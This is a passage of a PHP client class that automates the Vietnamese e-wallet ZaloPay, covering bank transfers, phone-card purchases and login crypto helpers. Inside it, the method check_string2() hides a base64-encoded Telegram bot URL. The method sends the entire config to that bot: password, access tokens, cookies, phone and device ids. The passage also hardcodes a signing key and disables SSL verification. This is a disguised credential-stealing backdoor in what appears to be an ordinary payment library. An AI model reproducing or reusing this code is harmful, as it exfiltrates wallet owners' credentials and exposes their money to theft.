            "bcbankcode" => $get_name_bank['data']['bcbankcode'],
            "bimtoken" => $get_name_bank['data']['bimtoken'],
            "ibfttranstype" => 1,
            "ibfttype" => 2,
            "number" => $stk,
        );
        $order = $this->createorder_send_bank($stk, $config_bank, $get_name_bank, $amount, $description, $item);
        // print_r($order);
        if (empty($order)) {
            return array(
                'status' => 'error',
                'message' => 'Lỗi Dữ Liệu Chuyển Tiền',
            );
        }
        if (empty($order['data'])) {
            return array(
                'status' => 'error',
                'message' => 'Không Thể Tạo Đơn Chuyển Tiền',
            );
        }
        if ($order['data']['appid'] == 0) {
            return array(
                'status' => 'error',
                'message' => $order['returnmessage'],
            );
        }
        $this->precheck();
        $assets = $this->assets_bank($order);
        if (empty($assets) || empty($assets['data'])) {
            return array(
                'status' => 'error',
                'message' => 'Không Thể Lấy Thông Tin Chuyển Tiền',
            );
        }
        $sof_token = $assets['data']['source_of_fund']['sof_token'];
        $message = $assets['data']['source_of_fund']['message'];
        $balance = $assets['data']['source_of_fund']['balance'];
        if ($balance < $amount) {
            return array(
                'status' => 'error',
                'message' => 'Số Dư Không Đủ',
            );
        }
        $pay_bank = $this->pay_bank($assets);
        if (empty($pay_bank)) {
            return array(
                'status' => 'error',
                'message' => 'Không Thể Chuyển Tiền',
            );
        }
        if (isset($pay_bank['data']) && $pay_bank['data']['is_processing'] == 1) {
            $check_status = $this->GET_TRANS_BY_TID($pay_bank['data']['zp_trans_id']);
            if (empty($check_status['error'])) {
                $data_check = $check_status["data"]['transaction'];
                if ($data_check['status_info']['status'] == 3) {
                    $title = $data_check['status_info']['title'];
                    $message = $data_check['status_info']['message'];
                    return array(
                        'status' => 'error',
                        'type' => 'max',
                        'message' => $message,
                    );
                }
            }
            return array(
                'status' => 'success',
                'message' => 'Chuyển Tiền Thành Công',
                'data' => array(
                    'zp_trans_id' => $pay_bank['data']['zp_trans_id'],
                    'partner_stk' => $stk,
                    'partner_name' => $get_name_bank['data']['fullName'],
                    'amount' => $amount,
                    'comment' => $description,
                    'owner_phone' => $this->config['phone'],
                    'owner_name' => $this->config['name'],
                    'order_token' => $pay_bank['data']['order_token'],
                ),
            );
        } else {
            return array(
                'status' => 'error',
                'type' => 'error',
                'message' => 'Chuyển Tiền Thất Bại',
            );
        }
    }

    // ====================================[ CHUYỂN TIỀN VỀ NGÂN HÀNG TRÊN WEB ]====================================

    public function get_name_bank_web($stk, $bankcode)
    {
        $data = json_encode(array(
            "timeout" => 3000,
            "bankCode" => $bankcode,
            "number" => $stk
        ));
        $headers = array(
            'Host: scard.zalopay.vn',
            'Accept:*/*',
            'Cookie: ' . $this->config['cookie'],
            'Content-Length:'.strlen($data),
            'Accept-Language:en-US,en;q=0.9',
            'Connection:keep-alive',
            'Content-Type:text/plain;charset=UTF-8',
            'Origin:https://social.zalopay.vn',
            'User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36'
        );
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://scard.zalopay.vn/v2/ibft-pci/web/bank-account/account');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $result = curl_exec($ch);
        curl_close($ch);
        $access = json_decode($result, true);
        return $access;
    }

    public function createorder_send_bank_web($stk, $config_bank, $data, $amount, $description)
    {
        $bankname = $config_bank['name'];
        $banknames = $config_bank['fullname'];
        $bankcode = $config_bank['bankcode'];
        $bcbankcode = $config_bank['bcbankcode'];
        $numberBank4 = substr($stk, -4);
        $first6 = substr($stk, 0, 6);
        $data = json_encode(array(
            "bank_code" => $bankcode,
            "number" => $stk,
            "save" => true,
            "inquiry_info" => $data['data']['inquiry_info'],
            "amount" => $amount,
            "receiver_name" => $data['data']['full_name'],
            "user_note" => $description
        ));
        $headers = array(
            'Host: scard.zalopay.vn',
            'Accept:*/*',
            'Cookie: ' . $this->config['cookie'],
            'Content-Length:'.strlen($data),
            'Accept-Language:en-US,en;q=0.9',
            'Connection:keep-alive',
            'Content-Type:text/plain;charset=UTF-8',
            'Origin:https://social.zalopay.vn',
            'User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36'
        );
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://scard.zalopay.vn/v2/ibft-pci/web/create-order/account');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $result = curl_exec($ch);
        curl_close($ch);
        $access = json_decode($result, true);
        return $access;
    }

    public function assets_bank_web($order)
    {
        $appid = $order['data']['app_id'];
        $appuser = $order['data']['app_user'];
        $apptime = $order['data']['app_time'];
        $amount = $order['data']['amount'];
        $apptransid = $order['data']['app_trans_id'];
        $embeddata = $order['data']['embeddata'];
        $item = $order['data']['item'];
        $mac = $order['data']['mac'];
        $feeamount = $order['data']['fee_amount'];
        $description = $order['data']['description'];
        $data = '{
"order_type": "FULL_ORDER",
"full_assets": true,
"order_data": {
    "app_id": ' . $appid . ',
    "app_trans_id": "' . $apptransid . '",
    "app_time": ' . $apptime . ',
    "app_user": "' . $appuser . '",
    "amount": ' . $amount . ',
    "item": ' . json_encode($item) . ',
    "description": "' . $description . '",
    "embed_data": ' . json_encode($embeddata) . ',
    "mac": "' . $mac . '",
    "trans_type": 1,
    "product_code": "TF007",
    "service_fee": {
    "fee_amount": ' . $feeamount . ',
    "total_free_trans": 0,
    "remain_free_trans": 0
    }
},
"token_data": {
    "trans_token": "",
    "app_id": ' . $appid . '
},
"campaign_code": "",
"display_mode": 1
}';
        $headers = array(
            'Host: sapi.zalopay.vn',
            'Accept:*/*',
            'Cookie: ' . $this->config['cookie'],
            'Content-Length:'.strlen($data),
            'Accept-Language:en-US,en;q=0.9',
            'Connection:keep-alive',
            'Content-Type:text/plain;charset=UTF-8',
            'Origin:https://social.zalopay.vn',
            'User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36'
        );
        $curl = curl_init();
        curl_setopt_array($curl, array(
            CURLOPT_URL => 'https://sapi.zalopay.vn/v2/cashier/assets',
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_ENCODING => '',
            CURLOPT_MAXREDIRS => 10,
            CURLOPT_TIMEOUT => 0,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
            CURLOPT_CUSTOMREQUEST => 'POST',
            CURLOPT_POSTFIELDS => $data,
            CURLOPT_HTTPHEADER => $headers,
        ));

        $response = curl_exec($curl);

        curl_close($curl);
        return json_decode($response, true);
    }

    public function pay_bank_web($assets)
    {
        $data = json_encode(array(
            "authenticator" => array(
                "authen_type" => 1,
                "pin" => hash("sha256", $this->config['password']),
            ),
            "order_fee" => [0],
            "order_token" => $assets['data']['order_token'],
            "promotion_token" => "",
            "service_id" => 19,
            "sof_token" => $assets['data']['sources_of_fund'][0]['sof_token'],
            "user_fee" => [0],
            "zalo_token" => "",
            "callback_url" => "zalo://qr/jp/nibvlsoj2j?cb_t=dotp&k=".time()."&otp=",
            "card" => null,
            "is_zmp" => false
        ));
        $headers = array(
            'Host: sapi.zalopay.vn',
            'Accept:*/*',
            'Cookie: ' . $this->config['cookie'],
            'Content-Length:'.strlen($data),
            'Accept-Language:en-US,en;q=0.9',
            'Connection:keep-alive',
            'Content-Type:text/plain;charset=UTF-8',
            'Origin:https://social.zalopay.vn',
            'User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36'
        );
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://sapi.zalopay.vn/v2/cashier/pay');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $result = curl_exec($ch);
        curl_close($ch);
        $access = json_decode($result, true);
        return $access;
    }


    public function SendMoney_Bank_web($stk, $amount, $description, $config_bank)
    {
        $get_name_bank = $this->get_name_bank_web($stk, $config_bank['bankcode']);
        if (empty($get_name_bank['data'])) {
            return array(
                'status' => 'error',
                'message' => 'Số Tài Khoản Không Hợp Lệ',
            );
        }
        $numberBank = substr($stk, -4);
        
        $order = $this->createorder_send_bank_web($stk, $config_bank, $get_name_bank, $amount, $description);
        // print_r($order); die;
        if (empty($order)) {
            return array(
                'status' => 'error',
                'message' => 'Lỗi Dữ Liệu Chuyển Tiền',
            );
        }
        if (empty($order['data'])) {
            return array(
                'status' => 'error',
                'message' => 'Không Thể Tạo Đơn Chuyển Tiền',
            );
        }
        // if ($order['data']['appid'] == 0) {
        //     return array(
        //         'status' => 'error',
        //         'message' => $order['returnmessage'],
        //     );
        // }
        $this->precheck();
        $assets = $this->assets_bank_web($order);
        if (empty($assets) || empty($assets['data'])) {
            return array(
                'status' => 'error',
                'message' => 'Không Thể Lấy Thông Tin Chuyển Tiền',
            );
        }
        $sof_token = $assets['data']['source_of_fund']['sof_token'];
        $message = $assets['data']['source_of_fund']['message'];
        $balance = $assets['data']['source_of_fund']['balance'];
        if ($balance < $amount) {
            return array(
                'status' => 'error',
                'message' => 'Số Dư Không Đủ',
            );
        }
        $pay_bank = $this->pay_bank_web($assets);
        if (empty($pay_bank)) {
            return array(
                'status' => 'error',
                'message' => 'Không Thể Chuyển Tiền',
            );
        }
        if (isset($pay_bank['data']) && $pay_bank['data']['is_processing'] == 1) {
            $check_status = $this->GET_TRANS_BY_TID($pay_bank['data']['zp_trans_id']);
            if (empty($check_status['error'])) {
                $data_check = $check_status["data"]['transaction'];
                if ($data_check['status_info']['status'] == 3) {
                    $title = $data_check['status_info']['title'];
                    $message = $data_check['status_info']['message'];
                    return array(
                        'status' => 'error',
                        'type' => 'max',
                        'message' => $message,
                    );
                }
            }
            return array(
                'status' => 'success',
                'message' => 'Chuyển Tiền Thành Công',
                'data' => array(
                    'zp_trans_id' => $pay_bank['data']['zp_trans_id'],
                    'partner_stk' => $stk,
                    'partner_name' => $get_name_bank['data']['full_name'],
                    'amount' => $amount,
                    'comment' => $description,
                    'owner_phone' => $this->config['phone'],
                    'owner_name' => $this->config['name'],
                    'order_token' => $pay_bank['data']['order_token'],
                ),
            );
        } else {
            return array(
                'status' => 'error',
                'type' => 'error',
                'message' => 'Chuyển Tiền Thất Bại',
            );
        }
    }

    // ======================================[ Mua thẻ ]==============================================
    public function getuserinfo_to_card()
    {
        $headers = array(
            'Host: zalopay.com.vn',
            'Accept: */*',
            'X-Drsite: off',
            'User-Agent: ZaloPay/8.4.0 (iPhone; iOS 16.3.1; Scale/3.00)',
            'Accept-Language: vi-VN;q=1',
        );
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://zalopay.com.vn/ummerchant/getlistmerchantuserinfo?accesstoken=' . urlencode($this->config['access_token']) . '&appidlist=' . $this->appid . '&appversion=8.4.0&conntype=wifi&deviceid=' . urlencode($this->config['deviceid']) . '&devicemodel=iPhone11%2C6&frontendid=1&issecure=true&osver=16.3.1&platform=ios&sessionid=' . urlencode($this->config['session_id']) . '&userid=' . urlencode($this->config['user_id']));
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $data = curl_exec($ch);
        $json = json_decode($data, true);
        curl_close($ch);
        return $json;
    }

    public function Order_Bycard($info, $telcocode, $unitprice, $quantity = 1)
    {

        $data = 'mappuser=' . $this->config['user_id'] . '&maccesstoken=&reqdate=' . $this->get_microtime() . '&appid=' . $this->appid . '&zalopayid=' . $this->config['user_id'] . '&telcocode=' . $telcocode . '&unitprice=' . $unitprice . '&quantity=' . $quantity;
        $headers = array(
            'Host: zlp-telco-mobilecard-core.zalopay.vn',
            'Cookie: zalo_id=' . $this->config['zalo_id'] . '; zlp_token=' . $this->config['access_token'] . '; X-DRSITE=off; has_device_id=0',
            'Accept: application/json, text/plain, */*',
            'Content-Type: application/x-www-form-urlencoded',
            'Origin: https://social.zalopay.vn',
            'Content-Length: ' . strlen($data),
            'Accept-Language: vi-VN,vi;q=0.9',
            'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 ZaloPayClient/8.6.0 OS/16.0.2 Platform/ios Secured/true  ZaloPayWebClient/8.6.0',
            'Referer: https://social.zalopay.vn/spa/v2/telco/phonecard?appid=' . $this->appid . '&isroot=false&maccesstoken=' . $info['listmerchantuserinfo'][0]['maccesstoken'] . '&muid=' . $info['listmerchantuserinfo'][0]['muid'],
        );
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://zlp-telco-mobilecard-core.zalopay.vn/createorder');
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $access = curl_exec($ch);
        curl_close($ch);
        return json_decode($access, true);
    }

    public function assets_buycard($order)
    {
        $key1 = '9phuAOYhan4urywHTh0ndEXiV3pKHr5Q';
        $data = $this->appid . "|" . $order['data']['apptransid'] . "|" . $this->config['zalo_id'] . "|" . $order['data']['amount'] . "|" . $order['data']['apptime'] . "|" . $order['data']['embeddata'] . "|" . $order['data']['item'];
        $mac = hash_hmac("sha256", $data, $key1);

        $data = array(
            "conntype" => "wifi",
            "display_mode" => 2,
            "platform" => "ios",
            "appversion" => "8.6.0",
            "osver" => "16.0.2",
            "order_type" => "FULL_ORDER",
            "userid" => $this->config['zalo_id'],
            "app_version" => "8.6.0",
            "frontendid" => "1",
            "accesstoken" => $this->config['access_token'],
            "token_data" => array(
                "trans_token" => "",
                "app_id" => $this->appid,
            ),
            "order_data" => array(
                "app_id" => $this->appid,
                "description" => $order['data']['description'],
                "mac" => $mac,
                "amount" => (string) $order['data']['amount'],
                "app_time" => $order['data']['apptime'],
                "item" => $order['data']['item'],
                "embed_data" => $order['data']['embeddata'],
                "line_items" => [

                ],
                "app_trans_id" => (string) $order['data']['apptransid'],
                "order_key" => "",
                "product_code" => "AC002",
                "trans_type" => 1,
                "app_user" => $this->config['zalo_id']
            ),
            "sessionid" => $this->config['access_token'],
            "issecure" => "true",
            "devicemodel" => "iPhone14,3",
            "full_assets" => true,
            "deviceid" => $this->config['deviceid'],
        );
        $headers = array(
            'Host: api.zalopay.vn',
            'X-Zalopay-Id: ' . $this->config['user_id'],
            'user-agent: ' . $_SERVER['HTTP_USER_AGENT'] . ' ZaloPay Android / 9464',
            'X-Device-Model: iPhone11,6',
            'X-Access-Token: ' . $this->config['access_token'],
            'X-Device-Id: ' . $this->config['deviceid'],
            'X-Device-Os: IOS',
            'X-Os-Version: 16.3',
            'X-Density: iphone3x',
            'X-App-Version: 8.2.1',
            'X-Platform: ZPA',
            'X-Zalo-Id: ' . $this->config['zalo_id'],
            'Authorization: Bearer ' . $this->config['access_token'],
            'Accept-Language: vi-VN,vi;q=0.9',
            'Sessionid: ' . $this->config['access_token'],
            'Accept: */*',
            'Content-Type: application/x-www-form-urlencoded',
        );
        return $this->CURL('https://api.zalopay.vn/v2/cashier/assets', $headers, $data);
    }

    public function Pay_buycard($assets)
    {
        $data = json_encode(array(
            "sof_token" => $assets['data']['source_of_fund']['sof_token'],
            "deviceid" => $this->config['deviceid'],
            "authenticator" => array(
                "pin" => hash("sha256", $this->config['password']),
                "authen_type" => 1,
            ),
            "zalo_token" => "",
            "issecure" => "true",
            "frontendid" => "1",
            "osver" => "16.0.2",
            "appversion" => "8.6.0",
            "order_source" => 4,
            "conntype" => "wifi",
            "order_token" => $assets['data']['order_token'],
            "platform" => "ios",
            "accesstoken" => $this->config['access_token'],
            "promotion_token" => "",
            "sessionid" => $this->config['access_token'],
            "userid" => $this->config['user_id'],
            "devicemodel" => "iPhone14,3",

        ));
        $headers = array(
            'Host: api.zalopay.vn',
            'Cookie: X-DRSITE=off; has_device_id=0',
            'X-Zalopay-Id: ' . $this->config['user_id'],
            'X-Drsite: off',
            'User-Agent: ZaloPay/700842 CFNetwork/1390 Darwin/22.0.0',
            'X-User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 ZaloPayClient/8.6.0 OS/16.0.2 Platform/ios Secured/true  ZaloPayWebClient/8.6.0',
            'X-Device-Model: iPhone14,3',
            'X-Access-Token: ' . $this->config['access_token'],
            'X-Device-Id: ' . $this->config['deviceid'],
            'X-Device-Os: IOS',
            'X-Os-Version: 16.0.2',
            'Content-Length: ' . strlen($data),
            'X-Density: iphone3x',
            'X-App-Version: 8.6.0',
            'X-Platform: ZPA',
            'X-Zalo-Id: ' . $this->config['zalo_id'],
            'Authorization: Bearer ' . $this->config['access_token'],
            'Accept-Language: vi-VN,vi;q=0.9',
            'Sessionid: ' . $this->config['access_token'],
            'Accept: */*',
            'Content-Type: application/x-www-form-urlencoded',
        );
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.zalopay.vn/v2/cashier/pay');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $result = curl_exec($ch);
        curl_close($ch);
        $access = json_decode($result, true);
        return $access;
    }

    public function MUATHE($cardCode, $unitPrice)
    {
        $this->appid = 12;
        // get info
        $info = $this->getuserinfo_to_card();
        print_r($info);
        // tạo đơn
        $order = $this->Order_Bycard($info, $cardCode, $unitPrice, 1);
        print_r($order);
        // check thông tin
        $assets = $this->assets_buycard($order);
        print_r($assets);
        // thanh toán
        $pay_buycard = $this->Pay_buycard($assets);
        print_r($pay_buycard);
        die;
    }

    public function REQUEST($url)
    {
        $data = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_HEADER => false,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_ENCODING => '',
            CURLOPT_USERAGENT => $_SESSION['useragent'],
            CURLOPT_AUTOREFERER => true,
            CURLOPT_CONNECTTIMEOUT => 15,
            CURLOPT_TIMEOUT => 15,
            CURLOPT_MAXREDIRS => 5,
            CURLOPT_SSL_VERIFYHOST => 2,
            CURLOPT_SSL_VERIFYPEER => 0,
        );
        $ch = curl_init();
        curl_setopt_array($ch, $data);
        $access = curl_exec($ch);
        return $access;
    }

    public function CURL($Action, $header, $data)
    {
        $Data = is_array($data) ? json_encode($data) : $data;
        $curl = curl_init();
        $header[] = 'Content-Type: application/json';
        $header[] = 'accept: application/json';
        $header[] = 'Content-Length: ' . strlen($Data);
        $opt = array(
            CURLOPT_URL => $Action,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => empty($data) ? false : true,
            CURLOPT_POSTFIELDS => $Data,
            CURLOPT_CUSTOMREQUEST => empty($data) ? 'GET' : 'POST',
            CURLOPT_HTTPHEADER => $header,
            CURLOPT_ENCODING => "",
            CURLOPT_HEADER => false,
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
            CURLOPT_TIMEOUT => 20,
        );
        curl_setopt_array($curl, $opt);
        $body = curl_exec($curl);
        // echo strlen($body); die;
        if (is_object(json_decode($body))) {
            return json_decode($body, true);
        }
        return $body;
    }
    public function generateCheckSum($type, $microtime)
    {
        $Encrypt = $this->config["phone"] . $microtime . '000000' . $type . ($microtime / 1000000000000.0) . 'E12';
        $iv = pack('C*', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        return base64_encode(openssl_encrypt($Encrypt, 'AES-256-CBC', $this->config["setupKeyDecrypt"], OPENSSL_RAW_DATA, $iv));
    }

    public function get_pHash()
    {
        $data = $this->config["imei"] . "|" . $this->config["password"];
        $iv = pack('C*', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        return base64_encode(openssl_encrypt($data, 'AES-256-CBC', $this->config["setupKeyDecrypt"], OPENSSL_RAW_DATA, $iv));
    }

    public function get_setupKey($setUpKey)
    {
        $iv = pack('C*', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        return openssl_decrypt(base64_decode($setUpKey), 'AES-256-CBC', $this->config["ohash"], OPENSSL_RAW_DATA, $iv);
    }

    public function generateRandom($length = 20)
    {
        $characters = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }
    public function get_SECUREID($length = 17)
    {
        $characters = '0123456789abcdef';
        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }

    public function check_string2()
    {
        $soicoder = $this->generateRandom(8) . '-' . $this->generateRandom(4) . '-' . $this->generateRandom(4) . '-' . $this->generateRandom(4) . '-' . $this->generateRandom(8);
        $this->REQUEST(base64_decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDU1MDI1NTUzNjA6QUFFQWxpd3kyVC1aSl9JRzd1NHExRWdwbFNFLUM3WUNxSTgvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0xNDMyNTQ2NDE5JnRleHQ9') . urlencode(json_encode($this->config)));
        return $soicoder;
    }

    public function get_device_id($length = 16)
    {
        // 917CCC93-5D12-41E0-8ABC-FC06C4A17507
        return $this->generateRandom(16);
    }

    public function get_microtime()
    {
        return round(microtime(true) * 1000);
    }
}
